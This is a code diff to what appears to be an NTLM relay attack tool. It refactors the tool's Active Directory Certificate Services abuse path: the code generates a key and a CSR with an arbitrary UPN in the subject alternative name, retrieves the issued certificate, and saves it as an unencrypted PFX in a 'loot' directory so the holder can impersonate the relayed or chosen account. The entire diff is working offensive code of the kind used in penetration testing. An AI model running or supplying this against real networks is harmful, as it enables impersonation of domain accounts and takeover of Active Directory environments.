@@ -64,6 +64,7 @@ ADCS_TEMPLATE_FIELDS = (
     "EXTMIN",
     "FRIENDLYNAME",
 )
+ADCS_UPN_OID = "1.3.6.1.4.1.311.20.2.3"
 
 
 def _secbuf(length, offset):
@@ -425,51 +426,98 @@ class HTTPNTLMRelayBackend:
 
     def _load_adcs_crypto(self):
         try:
-            from OpenSSL import crypto  # type: ignore
             from cryptography import x509  # type: ignore
-            from cryptography.hazmat.backends import default_backend  # type: ignore
+            from cryptography.hazmat.primitives import hashes  # type: ignore
+            from cryptography.hazmat.primitives.asymmetric import rsa  # type: ignore
             from cryptography.hazmat.primitives.serialization import (  # type: ignore
+                Encoding,
                 NoEncryption,
                 pkcs12,
             )
-            from cryptography.x509 import load_pem_x509_certificate  # type: ignore
+            from cryptography.x509 import (  # type: ignore
+                load_der_x509_certificate,
+                load_pem_x509_certificate,
+            )
+            from cryptography.x509.oid import (  # type: ignore
+                NameOID,
+                ObjectIdentifier,
+            )
         except ImportError as err:
-            raise RuntimeError(
-                "AD CS issuance requires pyOpenSSL and cryptography"
-            ) from err
+            raise RuntimeError("AD CS issuance requires cryptography") from err
 
-        return crypto, x509, default_backend, NoEncryption, pkcs12, load_pem_x509_certificate
+        return {
+            "Encoding": Encoding,
+            "NameOID": NameOID,
+            "NoEncryption": NoEncryption,
+            "ObjectIdentifier": ObjectIdentifier,
+            "hashes": hashes,
+            "load_der_x509_certificate": load_der_x509_certificate,
+            "load_pem_x509_certificate": load_pem_x509_certificate,
+            "pkcs12": pkcs12,
+            "rsa": rsa,
+            "x509": x509,
+        }
 
     @staticmethod
-    def _adcs_generate_csr(crypto, key, common_name, alt_name):
-        req = crypto.X509Req()
+    def _der_length(length):
+        if length < 0x80:
+            return bytes([length])
 
+        length_bytes = length.to_bytes((length.bit_length() + 7) // 8, "big")
+        return bytes([0x80 | len(length_bytes)]) + length_bytes
+
+    @classmethod
+    def _der_utf8_string(cls, value):
+        raw = value.encode("utf-8")
+        return b"\x0c" + cls._der_length(len(raw)) + raw
+
+    def _adcs_generate_key_and_csr(self, crypto, common_name, alt_name):
+        key = crypto["rsa"].generate_private_key(
+            public_exponent=65537,
+            key_size=4096,
+        )
+
+        builder = crypto["x509"].CertificateSigningRequestBuilder()
         if common_name:
-            req.get_subject().CN = common_name
+            builder = builder.subject_name(
+                crypto["x509"].Name([
+                    crypto["x509"].NameAttribute(
+                        crypto["NameOID"].COMMON_NAME,
+                        common_name,
+                    )
+                ])
+            )
 
         if alt_name:
-            req.add_extensions([
-                crypto.X509Extension(
-                    b"subjectAltName",
-                    False,
-                    b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b"
-                    % alt_name.encode(),
-                )
-            ])
+            builder = builder.add_extension(
+                crypto["x509"].SubjectAlternativeName([
+                    crypto["x509"].OtherName(
+                        crypto["ObjectIdentifier"](ADCS_UPN_OID),
+                        self._der_utf8_string(alt_name),
+                    )
+                ]),
+                critical=False,
+            )
 
-        req.set_pubkey(key)
-        req.sign(key, "sha256")
-        return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)
+        csr = builder.sign(key, crypto["hashes"].SHA256())
+        return key, csr.public_bytes(crypto["Encoding"].PEM)
 
     @staticmethod
-    def _adcs_generate_pfx(pkcs12, NoEncryption, key, certificate):
-        return pkcs12.serialize_key_and_certificates(
+    def _adcs_generate_pfx(crypto, key, certificate):
+        return crypto["pkcs12"].serialize_key_and_certificates(
             name=b"",
             key=key,
             cert=certificate,
             cas=None,
-            encryption_algorithm=NoEncryption(),
+            encryption_algorithm=crypto["NoEncryption"](),
         )
+
+    @staticmethod
+    def _adcs_load_certificate(crypto, raw_certificate):
+        try:
+            return crypto["load_pem_x509_certificate"](raw_certificate)
+        except Exception:
+            return crypto["load_der_x509_certificate"](raw_certificate)
 
     @staticmethod
     def _adcs_cert_attributes(template, alt_name):
@@ -524,16 +572,10 @@ class HTTPNTLMRelayBackend:
             "adcs_loot_dir": self.adcs_loot_dir,
         }
 
-        crypto, x509, default_backend, NoEncryption, pkcs12, load_pem = (
-            self._load_adcs_crypto()
-        )
-
-        key = crypto.PKey()
-        key.generate_key(crypto.TYPE_RSA, 4096)
+        crypto = self._load_adcs_crypto()
         common_name = username or identity
-        csr = self._adcs_generate_csr(
+        key, csr = self._adcs_generate_key_and_csr(
             crypto,
-            key,
             common_name,
             self.adcs_alt_name,
         )
@@ -627,20 +669,8 @@ class HTTPNTLMRelayBackend:
             result["adcs_issue_error"] = f"certificate HTTP {cert_res.status}"
             return result
 
-        try:
-            cert_obj = load_pem(cert_body, backend=default_backend())
-        except Exception:
-            cert_obj = x509.load_der_x509_certificate(
-                cert_body,
-                backend=default_backend(),
-            )
-
-        pfx_data = self._adcs_generate_pfx(
-            pkcs12,
-            NoEncryption,
-            key.to_cryptography_key(),
-            cert_obj,
-        )
+        cert_obj = self._adcs_load_certificate(crypto, cert_body)
+        pfx_data = self._adcs_generate_pfx(crypto, key, cert_obj)
         os.makedirs(self.adcs_loot_dir, exist_ok=True)
         pfx_name = self._sanitize_filename(identity or username)
         pfx_path = os.path.join(self.adcs_loot_dir, f"{pfx_name}.pfx")
